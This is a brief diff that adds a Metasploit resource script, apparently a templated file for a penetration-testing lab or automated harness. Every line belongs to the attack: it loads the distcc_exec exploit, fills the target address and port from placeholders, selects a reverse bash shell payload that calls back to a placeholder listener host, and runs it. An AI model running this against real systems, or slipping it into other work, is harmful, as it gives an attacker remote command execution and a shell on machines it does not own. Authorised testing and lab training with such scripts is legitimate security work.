@@ -1,0 +1,6 @@
+use exploit/unix/misc/distcc_exec
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST %%LHOST%%
+run
